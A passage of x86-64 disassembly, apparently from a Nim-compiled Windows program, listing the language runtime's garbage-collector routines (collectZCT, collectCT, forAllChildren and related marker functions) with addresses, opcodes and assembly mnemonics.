  4033ec:	48 8b 49 08          	mov    0x8(%rcx),%rcx
  4033f0:	0f b6 da             	movzbl %dl,%ebx
  4033f3:	89 da                	mov    %ebx,%edx
  4033f5:	e8 71 fd ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  4033fa:	48 8b 4e 10          	mov    0x10(%rsi),%rcx
  4033fe:	89 da                	mov    %ebx,%edx
  403400:	48 83 c4 28          	add    $0x28,%rsp
  403404:	5b                   	pop    %rbx
  403405:	5e                   	pop    %rsi
  403406:	e9 60 fd ff ff       	jmp    40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>

000000000040340b <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_3>:
  40340b:	48 83 ec 28          	sub    $0x28,%rsp
  40340f:	e8 8c e8 ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.74>
  403414:	31 d2                	xor    %edx,%edx
  403416:	48 8b 88 78 34 00 00 	mov    0x3478(%rax),%rcx
  40341d:	48 83 c4 28          	add    $0x28,%rsp
  403421:	e9 45 fd ff ff       	jmp    40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>

0000000000403426 <Marker_tySequence__oKfdUHDH0q5oP14wOM6kug>:
  403426:	57                   	push   %rdi
  403427:	56                   	push   %rsi
  403428:	53                   	push   %rbx
  403429:	48 83 ec 20          	sub    $0x20,%rsp
  40342d:	31 db                	xor    %ebx,%ebx
  40342f:	48 89 ce             	mov    %rcx,%rsi
  403432:	0f b6 fa             	movzbl %dl,%edi
  403435:	48 85 f6             	test   %rsi,%rsi
  403438:	74 1d                	je     403457 <Marker_tySequence__oKfdUHDH0q5oP14wOM6kug+0x31>
  40343a:	48 3b 1e             	cmp    (%rsi),%rbx
  40343d:	7d 18                	jge    403457 <Marker_tySequence__oKfdUHDH0q5oP14wOM6kug+0x31>
  40343f:	48 89 d8             	mov    %rbx,%rax
  403442:	89 fa                	mov    %edi,%edx
  403444:	48 ff c3             	inc    %rbx
  403447:	48 c1 e0 04          	shl    $0x4,%rax
  40344b:	48 8b 4c 06 18       	mov    0x18(%rsi,%rax,1),%rcx
  403450:	e8 16 fd ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  403455:	eb de                	jmp    403435 <Marker_tySequence__oKfdUHDH0q5oP14wOM6kug+0xf>
  403457:	48 83 c4 20          	add    $0x20,%rsp
  40345b:	5b                   	pop    %rbx
  40345c:	5e                   	pop    %rsi
  40345d:	5f                   	pop    %rdi
  40345e:	c3                   	ret

000000000040345f <TM__yu6cxgKBBXbNsTkT9cyMd4g_3>:
  40345f:	48 83 ec 28          	sub    $0x28,%rsp
  403463:	e8 38 e8 ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.74>
  403468:	31 d2                	xor    %edx,%edx
  40346a:	48 8b 88 60 34 00 00 	mov    0x3460(%rax),%rcx
  403471:	48 83 c4 28          	add    $0x28,%rsp
  403475:	e9 f1 fc ff ff       	jmp    40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>

000000000040347a <TM__yu6cxgKBBXbNsTkT9cyMd4g_2>:
  40347a:	48 83 ec 28          	sub    $0x28,%rsp
  40347e:	e8 1d e8 ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.74>
  403483:	31 d2                	xor    %edx,%edx
  403485:	48 8b 88 58 34 00 00 	mov    0x3458(%rax),%rcx
  40348c:	48 83 c4 28          	add    $0x28,%rsp
  403490:	e9 d6 fc ff ff       	jmp    40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>

0000000000403495 <Marker_tySequence__sM4lkSb7zS6F7OVMvW9cffQ>:
  403495:	57                   	push   %rdi
  403496:	56                   	push   %rsi
  403497:	53                   	push   %rbx
  403498:	48 83 ec 20          	sub    $0x20,%rsp
  40349c:	31 db                	xor    %ebx,%ebx
  40349e:	48 89 ce             	mov    %rcx,%rsi
  4034a1:	0f b6 fa             	movzbl %dl,%edi
  4034a4:	48 85 f6             	test   %rsi,%rsi
  4034a7:	74 16                	je     4034bf <Marker_tySequence__sM4lkSb7zS6F7OVMvW9cffQ+0x2a>
  4034a9:	48 3b 1e             	cmp    (%rsi),%rbx
  4034ac:	7d 11                	jge    4034bf <Marker_tySequence__sM4lkSb7zS6F7OVMvW9cffQ+0x2a>
  4034ae:	48 8b 4c de 10       	mov    0x10(%rsi,%rbx,8),%rcx
  4034b3:	89 fa                	mov    %edi,%edx
  4034b5:	48 ff c3             	inc    %rbx
  4034b8:	e8 ae fc ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  4034bd:	eb e5                	jmp    4034a4 <Marker_tySequence__sM4lkSb7zS6F7OVMvW9cffQ+0xf>
  4034bf:	48 83 c4 20          	add    $0x20,%rsp
  4034c3:	5b                   	pop    %rbx
  4034c4:	5e                   	pop    %rsi
  4034c5:	5f                   	pop    %rdi
  4034c6:	c3                   	ret

00000000004034c7 <TM__6NbDwwj5FY059b1gz2AsAZQ_5>:
  4034c7:	48 83 ec 28          	sub    $0x28,%rsp
  4034cb:	e8 d0 e7 ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.74>
  4034d0:	31 d2                	xor    %edx,%edx
  4034d2:	48 8b 88 48 34 00 00 	mov    0x3448(%rax),%rcx
  4034d9:	48 83 c4 28          	add    $0x28,%rsp
  4034dd:	e9 89 fc ff ff       	jmp    40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>

00000000004034e2 <TM__6NbDwwj5FY059b1gz2AsAZQ_4>:
  4034e2:	48 83 ec 28          	sub    $0x28,%rsp
  4034e6:	e8 b5 e7 ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.74>
  4034eb:	31 d2                	xor    %edx,%edx
  4034ed:	48 8b 88 40 34 00 00 	mov    0x3440(%rax),%rcx
  4034f4:	48 83 c4 28          	add    $0x28,%rsp
  4034f8:	e9 6e fc ff ff       	jmp    40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>

00000000004034fd <Marker_tyRef__9a5v4OQPlGqsA25ioN8hFYA>:
  4034fd:	56                   	push   %rsi
  4034fe:	53                   	push   %rbx
  4034ff:	48 83 ec 28          	sub    $0x28,%rsp
  403503:	48 89 ce             	mov    %rcx,%rsi
  403506:	48 8b 49 08          	mov    0x8(%rcx),%rcx
  40350a:	0f b6 da             	movzbl %dl,%ebx
  40350d:	89 da                	mov    %ebx,%edx
  40350f:	e8 57 fc ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  403514:	48 8b 4e 18          	mov    0x18(%rsi),%rcx
  403518:	89 da                	mov    %ebx,%edx
  40351a:	e8 4c fc ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  40351f:	48 8b 4e 20          	mov    0x20(%rsi),%rcx
  403523:	89 da                	mov    %ebx,%edx
  403525:	48 83 c4 28          	add    $0x28,%rsp
  403529:	5b                   	pop    %rbx
  40352a:	5e                   	pop    %rsi
  40352b:	e9 3b fc ff ff       	jmp    40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>

0000000000403530 <forAllSlotsAux__ld9axHPi9bpxevVrdgKiDF5Q>:
  403530:	41 55                	push   %r13
  403532:	41 54                	push   %r12
  403534:	55                   	push   %rbp
  403535:	57                   	push   %rdi
  403536:	56                   	push   %rsi
  403537:	53                   	push   %rbx
  403538:	48 83 ec 28          	sub    $0x28,%rsp
  40353c:	8a 02                	mov    (%rdx),%al
  40353e:	3c 02                	cmp    $0x2,%al
  403540:	48 89 cb             	mov    %rcx,%rbx
  403543:	48 89 d7             	mov    %rdx,%rdi
  403546:	74 30                	je     403578 <forAllSlotsAux__ld9axHPi9bpxevVrdgKiDF5Q+0x48>
  403548:	3c 03                	cmp    $0x3,%al
  40354a:	0f 84 99 00 00 00    	je     4035e9 <forAllSlotsAux__ld9axHPi9bpxevVrdgKiDF5Q+0xb9>
  403550:	fe c8                	dec    %al
  403552:	0f 85 b6 00 00 00    	jne    40360e <forAllSlotsAux__ld9axHPi9bpxevVrdgKiDF5Q+0xde>
  403558:	48 03 5f 08          	add    0x8(%rdi),%rbx
  40355c:	45 0f b6 c0          	movzbl %r8b,%r8d
  403560:	48 8b 52 10          	mov    0x10(%rdx),%rdx
  403564:	48 89 d9             	mov    %rbx,%rcx
  403567:	48 83 c4 28          	add    $0x28,%rsp
  40356b:	5b                   	pop    %rbx
  40356c:	5e                   	pop    %rsi
  40356d:	5f                   	pop    %rdi
  40356e:	5d                   	pop    %rbp
  40356f:	41 5c                	pop    %r12
  403571:	41 5d                	pop    %r13
  403573:	e9 a3 00 00 00       	jmp    40361b <forAllChildrenAux__3hKpU9c72lqUqbltnsyFjRw>
  403578:	48 8b 42 20          	mov    0x20(%rdx),%rax
  40357c:	41 0f b6 f0          	movzbl %r8b,%esi
  403580:	31 ed                	xor    %ebp,%ebp
  403582:	41 bd 00 00 40 11    	mov    $0x11400000,%r13d
  403588:	4c 8d 60 ff          	lea    -0x1(%rax),%r12
  40358c:	49 39 ec             	cmp    %rbp,%r12
  40358f:	7c 7d                	jl     40360e <forAllSlotsAux__ld9axHPi9bpxevVrdgKiDF5Q+0xde>
  403591:	48 8b 47 28          	mov    0x28(%rdi),%rax
  403595:	48 8b 04 e8          	mov    (%rax,%rbp,8),%rax
  403599:	80 38 01             	cmpb   $0x1,(%rax)
  40359c:	74 10                	je     4035ae <forAllSlotsAux__ld9axHPi9bpxevVrdgKiDF5Q+0x7e>
  40359e:	41 89 f0             	mov    %esi,%r8d
  4035a1:	48 89 c2             	mov    %rax,%rdx
  4035a4:	48 89 d9             	mov    %rbx,%rcx
  4035a7:	e8 84 ff ff ff       	call   403530 <forAllSlotsAux__ld9axHPi9bpxevVrdgKiDF5Q>
  4035ac:	eb 36                	jmp    4035e4 <forAllSlotsAux__ld9axHPi9bpxevVrdgKiDF5Q+0xb4>
  4035ae:	48 8b 48 08          	mov    0x8(%rax),%rcx
  4035b2:	4d 89 e9             	mov    %r13,%r9
  4035b5:	48 8b 50 10          	mov    0x10(%rax),%rdx
  4035b9:	48 01 d9             	add    %rbx,%rcx
  4035bc:	48 89 c8             	mov    %rcx,%rax
  4035bf:	8a 4a 08             	mov    0x8(%rdx),%cl
  4035c2:	49 d3 e9             	shr    %cl,%r9
  4035c5:	4c 89 c9             	mov    %r9,%rcx
  4035c8:	80 e1 01             	and    $0x1,%cl
  4035cb:	75 0d                	jne    4035da <forAllSlotsAux__ld9axHPi9bpxevVrdgKiDF5Q+0xaa>
  4035cd:	41 89 f0             	mov    %esi,%r8d
  4035d0:	48 89 c1             	mov    %rax,%rcx
  4035d3:	e8 43 00 00 00       	call   40361b <forAllChildrenAux__3hKpU9c72lqUqbltnsyFjRw>
  4035d8:	eb 0a                	jmp    4035e4 <forAllSlotsAux__ld9axHPi9bpxevVrdgKiDF5Q+0xb4>
  4035da:	48 8b 08             	mov    (%rax),%rcx
  4035dd:	89 f2                	mov    %esi,%edx
  4035df:	e8 87 fb ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  4035e4:	48 ff c5             	inc    %rbp
  4035e7:	eb a3                	jmp    40358c <forAllSlotsAux__ld9axHPi9bpxevVrdgKiDF5Q+0x5c>
  4035e9:	e8 b0 e0 ff ff       	call   40169e <selectBranch__2us2RQByTh81i9aW4EEgfmw>
  4035ee:	48 85 c0             	test   %rax,%rax
  4035f1:	74 1b                	je     40360e <forAllSlotsAux__ld9axHPi9bpxevVrdgKiDF5Q+0xde>
  4035f3:	45 0f b6 c0          	movzbl %r8b,%r8d
  4035f7:	48 89 c2             	mov    %rax,%rdx
  4035fa:	48 89 d9             	mov    %rbx,%rcx
  4035fd:	48 83 c4 28          	add    $0x28,%rsp
  403601:	5b                   	pop    %rbx
  403602:	5e                   	pop    %rsi
  403603:	5f                   	pop    %rdi
  403604:	5d                   	pop    %rbp
  403605:	41 5c                	pop    %r12
  403607:	41 5d                	pop    %r13
  403609:	e9 22 ff ff ff       	jmp    403530 <forAllSlotsAux__ld9axHPi9bpxevVrdgKiDF5Q>
  40360e:	48 83 c4 28          	add    $0x28,%rsp
  403612:	5b                   	pop    %rbx
  403613:	5e                   	pop    %rsi
  403614:	5f                   	pop    %rdi
  403615:	5d                   	pop    %rbp
  403616:	41 5c                	pop    %r12
  403618:	41 5d                	pop    %r13
  40361a:	c3                   	ret

000000000040361b <forAllChildrenAux__3hKpU9c72lqUqbltnsyFjRw>:
  40361b:	41 54                	push   %r12
  40361d:	55                   	push   %rbp
  40361e:	57                   	push   %rdi
  40361f:	56                   	push   %rsi
  403620:	53                   	push   %rbx
  403621:	48 83 ec 20          	sub    $0x20,%rsp
  403625:	48 85 c9             	test   %rcx,%rcx
  403628:	49 89 cc             	mov    %rcx,%r12
  40362b:	48 89 d7             	mov    %rdx,%rdi
  40362e:	0f 84 9a 00 00 00    	je     4036ce <forAllChildrenAux__3hKpU9c72lqUqbltnsyFjRw+0xb3>
  403634:	f6 42 09 01          	testb  $0x1,0x9(%rdx)
  403638:	0f 85 90 00 00 00    	jne    4036ce <forAllChildrenAux__3hKpU9c72lqUqbltnsyFjRw+0xb3>
  40363e:	8a 4a 08             	mov    0x8(%rdx),%cl
  403641:	80 f9 1c             	cmp    $0x1c,%cl
  403644:	0f 87 84 00 00 00    	ja     4036ce <forAllChildrenAux__3hKpU9c72lqUqbltnsyFjRw+0xb3>
  40364a:	b8 01 00 00 00       	mov    $0x1,%eax
  40364f:	48 d3 e0             	shl    %cl,%rax
  403652:	a9 10 00 01 08       	test   $0x8010010,%eax
  403657:	75 3f                	jne    403698 <forAllChildrenAux__3hKpU9c72lqUqbltnsyFjRw+0x7d>
  403659:	a9 00 00 40 11       	test   $0x11400000,%eax
  40365e:	75 21                	jne    403681 <forAllChildrenAux__3hKpU9c72lqUqbltnsyFjRw+0x66>
  403660:	a9 00 00 06 00       	test   $0x60000,%eax
  403665:	74 67                	je     4036ce <forAllChildrenAux__3hKpU9c72lqUqbltnsyFjRw+0xb3>
  403667:	48 8b 52 18          	mov    0x18(%rdx),%rdx
  40366b:	45 0f b6 c0          	movzbl %r8b,%r8d
  40366f:	4c 89 e1             	mov    %r12,%rcx
  403672:	48 83 c4 20          	add    $0x20,%rsp
  403676:	5b                   	pop    %rbx
  403677:	5e                   	pop    %rsi
  403678:	5f                   	pop    %rdi
  403679:	5d                   	pop    %rbp
  40367a:	41 5c                	pop    %r12
  40367c:	e9 af fe ff ff       	jmp    403530 <forAllSlotsAux__ld9axHPi9bpxevVrdgKiDF5Q>
  403681:	49 8b 0c 24          	mov    (%r12),%rcx
  403685:	41 0f b6 d0          	movzbl %r8b,%edx
  403689:	48 83 c4 20          	add    $0x20,%rsp
  40368d:	5b                   	pop    %rbx
  40368e:	5e                   	pop    %rsi
  40368f:	5f                   	pop    %rdi
  403690:	5d                   	pop    %rbp
  403691:	41 5c                	pop    %r12
  403693:	e9 d3 fa ff ff       	jmp    40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  403698:	48 8b 02             	mov    (%rdx),%rax
  40369b:	41 0f b6 f0          	movzbl %r8b,%esi
  40369f:	31 ed                	xor    %ebp,%ebp
  4036a1:	48 8b 5a 10          	mov    0x10(%rdx),%rbx
  4036a5:	48 99                	cqto
  4036a7:	48 f7 3b             	idivq  (%rbx)
  4036aa:	48 8d 58 ff          	lea    -0x1(%rax),%rbx
  4036ae:	48 39 eb             	cmp    %rbp,%rbx
  4036b1:	7c 1b                	jl     4036ce <forAllChildrenAux__3hKpU9c72lqUqbltnsyFjRw+0xb3>
  4036b3:	48 8b 57 10          	mov    0x10(%rdi),%rdx
  4036b7:	41 89 f0             	mov    %esi,%r8d
  4036ba:	48 8b 0a             	mov    (%rdx),%rcx
  4036bd:	48 0f af cd          	imul   %rbp,%rcx
  4036c1:	48 ff c5             	inc    %rbp
  4036c4:	4c 01 e1             	add    %r12,%rcx
  4036c7:	e8 4f ff ff ff       	call   40361b <forAllChildrenAux__3hKpU9c72lqUqbltnsyFjRw>
  4036cc:	eb e0                	jmp    4036ae <forAllChildrenAux__3hKpU9c72lqUqbltnsyFjRw+0x93>
  4036ce:	48 83 c4 20          	add    $0x20,%rsp
  4036d2:	5b                   	pop    %rbx
  4036d3:	5e                   	pop    %rsi
  4036d4:	5f                   	pop    %rdi
  4036d5:	5d                   	pop    %rbp
  4036d6:	41 5c                	pop    %r12
  4036d8:	c3                   	ret

00000000004036d9 <forAllChildren__XCvXrotwhq0gugZtuZTNPQ>:
  4036d9:	41 54                	push   %r12
  4036db:	55                   	push   %rbp
  4036dc:	57                   	push   %rdi
  4036dd:	56                   	push   %rsi
  4036de:	53                   	push   %rbx
  4036df:	48 83 ec 20          	sub    $0x20,%rsp
  4036e3:	48 89 cb             	mov    %rcx,%rbx
  4036e6:	48 8b 49 08          	mov    0x8(%rcx),%rcx
  4036ea:	41 89 d0             	mov    %edx,%r8d
  4036ed:	4c 8b 49 28          	mov    0x28(%rcx),%r9
  4036f1:	4d 85 c9             	test   %r9,%r9
  4036f4:	75 0f                	jne    403705 <forAllChildren__XCvXrotwhq0gugZtuZTNPQ+0x2c>
  4036f6:	8a 51 08             	mov    0x8(%rcx),%dl
  4036f9:	80 fa 16             	cmp    $0x16,%dl
  4036fc:	74 1b                	je     403719 <forAllChildren__XCvXrotwhq0gugZtuZTNPQ+0x40>
  4036fe:	80 fa 18             	cmp    $0x18,%dl
  403701:	74 31                	je     403734 <forAllChildren__XCvXrotwhq0gugZtuZTNPQ+0x5b>
  403703:	eb 6b                	jmp    403770 <forAllChildren__XCvXrotwhq0gugZtuZTNPQ+0x97>
  403705:	48 8d 4b 10          	lea    0x10(%rbx),%rcx
  403709:	0f b6 d2             	movzbl %dl,%edx
  40370c:	48 83 c4 20          	add    $0x20,%rsp
  403710:	5b                   	pop    %rbx
  403711:	5e                   	pop    %rsi
  403712:	5f                   	pop    %rdi
  403713:	5d                   	pop    %rbp
  403714:	41 5c                	pop    %r12
  403716:	49 ff e1             	rex.WB jmp *%r9
  403719:	48 8b 51 10          	mov    0x10(%rcx),%rdx
  40371d:	48 8d 4b 10          	lea    0x10(%rbx),%rcx
  403721:	45 0f b6 c0          	movzbl %r8b,%r8d
  403725:	48 83 c4 20          	add    $0x20,%rsp
  403729:	5b                   	pop    %rbx
  40372a:	5e                   	pop    %rsi
  40372b:	5f                   	pop    %rdi
  40372c:	5d                   	pop    %rbp
  40372d:	41 5c                	pop    %r12
  40372f:	e9 e7 fe ff ff       	jmp    40361b <forAllChildrenAux__3hKpU9c72lqUqbltnsyFjRw>
  403734:	48 83 fb f0          	cmp    $0xfffffffffffffff0,%rbx
  403738:	74 36                	je     403770 <forAllChildren__XCvXrotwhq0gugZtuZTNPQ+0x97>
  40373a:	48 8b 7b 10          	mov    0x10(%rbx),%rdi
  40373e:	4c 8d 63 20          	lea    0x20(%rbx),%r12
  403742:	31 f6                	xor    %esi,%esi
  403744:	48 8d 6f ff          	lea    -0x1(%rdi),%rbp
  403748:	41 0f b6 f8          	movzbl %r8b,%edi
  40374c:	48 39 f5             	cmp    %rsi,%rbp
  40374f:	7c 1f                	jl     403770 <forAllChildren__XCvXrotwhq0gugZtuZTNPQ+0x97>
  403751:	48 8b 43 08          	mov    0x8(%rbx),%rax
  403755:	41 89 f8             	mov    %edi,%r8d
  403758:	48 8b 50 10          	mov    0x10(%rax),%rdx
  40375c:	48 8b 0a             	mov    (%rdx),%rcx
  40375f:	48 0f af ce          	imul   %rsi,%rcx
  403763:	48 ff c6             	inc    %rsi
  403766:	4c 01 e1             	add    %r12,%rcx
  403769:	e8 ad fe ff ff       	call   40361b <forAllChildrenAux__3hKpU9c72lqUqbltnsyFjRw>
  40376e:	eb dc                	jmp    40374c <forAllChildren__XCvXrotwhq0gugZtuZTNPQ+0x73>
  403770:	48 83 c4 20          	add    $0x20,%rsp
  403774:	5b                   	pop    %rbx
  403775:	5e                   	pop    %rsi
  403776:	5f                   	pop    %rdi
  403777:	5d                   	pop    %rbp
  403778:	41 5c                	pop    %r12
  40377a:	c3                   	ret

000000000040377b <collectZCT__EN6T32AMm3va9bsrdxtF0cg>:
  40377b:	57                   	push   %rdi
  40377c:	56                   	push   %rsi
  40377d:	53                   	push   %rbx
  40377e:	48 83 ec 20          	sub    $0x20,%rsp
  403782:	48 8d 79 68          	lea    0x68(%rcx),%rdi
  403786:	48 89 ce             	mov    %rcx,%rsi
  403789:	48 83 7e 18 00       	cmpq   $0x0,0x18(%rsi)
  40378e:	7e 46                	jle    4037d6 <collectZCT__EN6T32AMm3va9bsrdxtF0cg+0x5b>
  403790:	48 8b 56 28          	mov    0x28(%rsi),%rdx
  403794:	48 8b 1a             	mov    (%rdx),%rbx
  403797:	48 83 23 fb          	andq   $0xfffffffffffffffb,(%rbx)
  40379b:	48 8b 46 18          	mov    0x18(%rsi),%rax
  40379f:	48 8b 4c c2 f8       	mov    -0x8(%rdx,%rax,8),%rcx
  4037a4:	48 ff c8             	dec    %rax
  4037a7:	48 89 0a             	mov    %rcx,(%rdx)
  4037aa:	48 89 46 18          	mov    %rax,0x18(%rsi)
  4037ae:	48 83 3b 07          	cmpq   $0x7,(%rbx)
  4037b2:	77 d5                	ja     403789 <collectZCT__EN6T32AMm3va9bsrdxtF0cg+0xe>
  4037b4:	48 89 d9             	mov    %rbx,%rcx
  4037b7:	e8 9a e5 ff ff       	call   401d56 <prepareDealloc__fvhnFro5wEfzy879alizcUQ>
  4037bc:	48 89 d9             	mov    %rbx,%rcx
  4037bf:	ba 02 00 00 00       	mov    $0x2,%edx
  4037c4:	e8 10 ff ff ff       	call   4036d9 <forAllChildren__XCvXrotwhq0gugZtuZTNPQ>
  4037c9:	48 89 da             	mov    %rbx,%rdx
  4037cc:	48 89 f9             	mov    %rdi,%rcx
  4037cf:	e8 40 ec ff ff       	call   402414 <rawDealloc__K7uQ6aTKvW6OnOV8EMoNNQ>
  4037d4:	eb b3                	jmp    403789 <collectZCT__EN6T32AMm3va9bsrdxtF0cg+0xe>
  4037d6:	b0 01                	mov    $0x1,%al
  4037d8:	48 83 c4 20          	add    $0x20,%rsp
  4037dc:	5b                   	pop    %rbx
  4037dd:	5e                   	pop    %rsi
  4037de:	5f                   	pop    %rdi
  4037df:	c3                   	ret

00000000004037e0 <collectCT__XHio9cMpnLoH7GyCj1Z9besg>:
  4037e0:	41 57                	push   %r15
  4037e2:	41 56                	push   %r14
  4037e4:	41 55                	push   %r13
  4037e6:	41 54                	push   %r12
  4037e8:	55                   	push   %rbp
  4037e9:	57                   	push   %rdi
  4037ea:	56                   	push   %rsi
  4037eb:	53                   	push   %rbx
  4037ec:	48 83 ec 48          	sub    $0x48,%rsp
  4037f0:	48 8b 41 18          	mov    0x18(%rcx),%rax
  4037f4:	48 39 41 10          	cmp    %rax,0x10(%rcx)
  4037f8:	49 89 cd             	mov    %rcx,%r13
  4037fb:	7e 11                	jle    40380e <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x2e>
  4037fd:	48 8b 81 00 29 00 00 	mov    0x2900(%rcx),%rax
  403804:	48 39 41 08          	cmp    %rax,0x8(%rcx)
  403808:	0f 8f 21 04 00 00    	jg     403c2f <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x44f>
  40380e:	49 83 7d 60 00       	cmpq   $0x0,0x60(%r13)
  403813:	0f 85 16 04 00 00    	jne    403c2f <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x44f>
  403819:	e8 71 e5 ff ff       	call   401d8f <stackSize__0yw8cp0rOgL8i0O5kzzb0g>
  40381e:	49 39 85 70 33 00 00 	cmp    %rax,0x3370(%r13)
  403825:	49 0f 4d 85 70 33 00 	cmovge 0x3370(%r13),%rax
  40382c:	00 
  40382d:	45 31 c9             	xor    %r9d,%r9d
  403830:	49 89 85 70 33 00 00 	mov    %rax,0x3370(%r13)
  403837:	49 8b 85 10 31 00 00 	mov    0x3110(%r13),%rax
  40383e:	48 89 c2             	mov    %rax,%rdx
  403841:	48 8b 0a             	mov    (%rdx),%rcx
  403844:	48 39 ca             	cmp    %rcx,%rdx
  403847:	75 0a                	jne    403853 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x73>
  403849:	4d 89 4d 68          	mov    %r9,0x68(%r13)
  40384d:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
  403851:	eb 11                	jmp    403864 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x84>
  403853:	4c 8b 4a 10          	mov    0x10(%rdx),%r9
  403857:	48 89 ca             	mov    %rcx,%rdx
  40385a:	eb e5                	jmp    403841 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x61>
  40385c:	48 8b 50 18          	mov    0x18(%rax),%rdx
  403860:	48 8b 40 08          	mov    0x8(%rax),%rax
  403864:	48 3b 00             	cmp    (%rax),%rax
  403867:	75 f3                	jne    40385c <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x7c>
  403869:	49 89 55 70          	mov    %rdx,0x70(%r13)
  40386d:	4c 89 e9             	mov    %r13,%rcx
  403870:	e8 08 f5 ff ff       	call   402d7d <markStackAndRegisters__U6T7JWtDLrWhtmhXSoy9a6g>
  403875:	49 8b 45 30          	mov    0x30(%r13),%rax
  403879:	4c 89 e9             	mov    %r13,%rcx
  40387c:	49 39 85 78 33 00 00 	cmp    %rax,0x3378(%r13)
  403883:	49 0f 4d 85 78 33 00 	cmovge 0x3378(%r13),%rax
  40388a:	00 
  40388b:	49 ff 85 58 33 00 00 	incq   0x3358(%r13)
  403892:	49 89 85 78 33 00 00 	mov    %rax,0x3378(%r13)
  403899:	e8 dd fe ff ff       	call   40377b <collectZCT__EN6T32AMm3va9bsrdxtF0cg>
  40389e:	84 c0                	test   %al,%al
  4038a0:	0f 84 44 03 00 00    	je     403bea <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x40a>
  4038a6:	49 8b 45 08          	mov    0x8(%r13),%rax
  4038aa:	49 39 85 00 29 00 00 	cmp    %rax,0x2900(%r13)
  4038b1:	0f 8c 33 03 00 00    	jl     403bea <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x40a>
  4038b7:	49 8d ad d8 33 00 00 	lea    0x33d8(%r13),%rbp
  4038be:	48 89 e9             	mov    %rbp,%rcx
  4038c1:	ff 15 a5 49 04 00    	call   *0x449a5(%rip)        # 44826c <__imp_EnterCriticalSection>
  4038c7:	49 8b 9d c8 33 00 00 	mov    0x33c8(%r13),%rbx
  4038ce:	48 85 db             	test   %rbx,%rbx
  4038d1:	75 0b                	jne    4038de <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0xfe>
  4038d3:	48 89 e9             	mov    %rbp,%rcx
  4038d6:	ff 15 e0 49 04 00    	call   *0x449e0(%rip)        # 4482bc <__imp_LeaveCriticalSection>
  4038dc:	eb 6b                	jmp    403949 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x169>
  4038de:	48 8b 43 08          	mov    0x8(%rbx),%rax
  4038e2:	31 f6                	xor    %esi,%esi
  4038e4:	48 8d 78 ff          	lea    -0x1(%rax),%rdi
  4038e8:	48 39 f7             	cmp    %rsi,%rdi
  4038eb:	7d 05                	jge    4038f2 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x112>
  4038ed:	48 8b 1b             	mov    (%rbx),%rbx
  4038f0:	eb dc                	jmp    4038ce <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0xee>
  4038f2:	4c 8b 64 f3 10       	mov    0x10(%rbx,%rsi,8),%r12
  4038f7:	e8 a4 e3 ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.74>
  4038fc:	48 8b 90 e8 33 00 00 	mov    0x33e8(%rax),%rdx
  403903:	4c 8b 90 f8 33 00 00 	mov    0x33f8(%rax),%r10
  40390a:	49 8d 4c 24 f0       	lea    -0x10(%r12),%rcx
  40390f:	48 ff ca             	dec    %rdx
  403912:	49 89 d1             	mov    %rdx,%r9
  403915:	4d 85 c9             	test   %r9,%r9
  403918:	78 1d                	js     403937 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x157>
  40391a:	4b 3b 0c ca          	cmp    (%r10,%r9,8),%rcx
  40391e:	4f 8d 1c ca          	lea    (%r10,%r9,8),%r11
  403922:	74 05                	je     403929 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x149>
  403924:	49 ff c9             	dec    %r9
  403927:	eb ec                	jmp    403915 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x135>
  403929:	4d 8b 0c d2          	mov    (%r10,%rdx,8),%r9
  40392d:	4d 89 0b             	mov    %r9,(%r11)
  403930:	48 89 90 e8 33 00 00 	mov    %rdx,0x33e8(%rax)
  403937:	e8 55 f5 ff ff       	call   402e91 <decRef__AT1eRuflKWyTTBdLjEDZbgsystem.lto_priv.83>
  40393c:	48 ff c6             	inc    %rsi
  40393f:	eb a7                	jmp    4038e8 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x108>
  403941:	4c 89 e9             	mov    %r13,%rcx
  403944:	e8 32 fe ff ff       	call   40377b <collectZCT__EN6T32AMm3va9bsrdxtF0cg>
  403949:	49 83 7d 18 00       	cmpq   $0x0,0x18(%r13)
  40394e:	7f f1                	jg     403941 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x161>
  403950:	49 8b 8d a0 33 00 00 	mov    0x33a0(%r13),%rcx
  403957:	49 8d 85 90 33 00 00 	lea    0x3390(%r13),%rax
  40395e:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  403963:	48 85 c9             	test   %rcx,%rcx
  403966:	75 6f                	jne    4039d7 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x1f7>
  403968:	49 8b 8d a8 33 00 00 	mov    0x33a8(%r13),%rcx
  40396f:	31 db                	xor    %ebx,%ebx
